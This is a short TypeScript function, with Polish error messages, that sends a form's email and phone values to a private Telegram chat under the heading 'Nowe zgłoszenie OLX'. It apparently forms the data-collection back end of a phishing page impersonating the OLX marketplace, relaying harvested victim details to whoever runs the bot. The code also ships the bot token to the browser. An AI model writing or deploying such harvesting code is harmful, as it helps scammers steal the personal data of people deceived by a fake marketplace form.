// Telegram API utility for sending form data
export async function sendToTelegram(formData: { email: string; phone: string }) {
  const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
  const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    throw new Error('Brak konfiguracji Telegram. Sprawdź zmienne środowiskowe.');
  }

  const message = `🆕 Nowe zgłoszenie OLX\n\n📧 Email: ${formData.email}\n📱 Telefon: ${formData.phone}\n\n⏰ Data: ${new Date().toLocaleString('pl-PL')}`;

  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  const response = await fetch(telegramUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  });

  if (!response.ok) {
    const errorData = await response.json().catch(() => ({}));
    console.error('Telegram API error:', errorData);
    throw new Error('Nie udało się wysłać wiadomości do Telegram');
  }

  return response.json();
}